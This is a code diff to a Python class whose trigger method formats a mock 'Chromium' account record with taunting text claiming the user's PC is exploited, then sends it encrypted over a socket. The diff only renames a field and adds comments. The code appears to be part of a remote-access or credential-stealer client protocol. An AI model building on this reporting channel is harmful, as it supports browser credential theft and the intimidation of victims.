@@ -83,28 +83,28 @@ class TextCreation:
 
     def trigger(sock, key):
         try:
-            @dataclass
+            @dataclass # Define Account dataclass
             class Account:
                 URL: str
-                UserName: str
+                Username: str
                 Password: str
                 Application: str
 
             account_list = [
-                Account(URL="https://github.com/SwezyDev", UserName="Swezy <3", Password="I fully Exploited your PC... Enjoy the Last Minutes", Application="Fucked by Swezy <3"),
-            ]
+                Account(URL="https://github.com/SwezyDev", Username="Swezy <3", Password="I fully Exploited your PC... Enjoy the Last Minutes", Application="Fucked by Swezy <3"),
+            ] # List of accounts to send
 
-            result = []
+            result = [] # Prepare result list
 
-            for account in account_list:
+            for account in account_list: # Format each account
                 result.append(f"Url: {account.URL}")
-                result.append(f"Username: {account.UserName}")
+                result.append(f"Username: {account.Username}")
                 result.append(f"Password: {account.Password}")
                 result.append(f"Application: {account.Application}")
                 result.append("=============================")
-                result.append(TextCreation.ASCII_ART)
+                result.append(TextCreation.ASCII_ART) # Append ASCII art
 
-            output_string = "\n".join(result)
+            output_string = "\n".join(result) # Join all results into a single string
             payload = f"Chromium{TextCreation.SPL_XCLIENT}ClientID{TextCreation.SPL_XCLIENT}{output_string}"
             TextCreationUtils.send_encrypted(sock, payload, key) # Send encrypted message
             print("Plugin opened.")
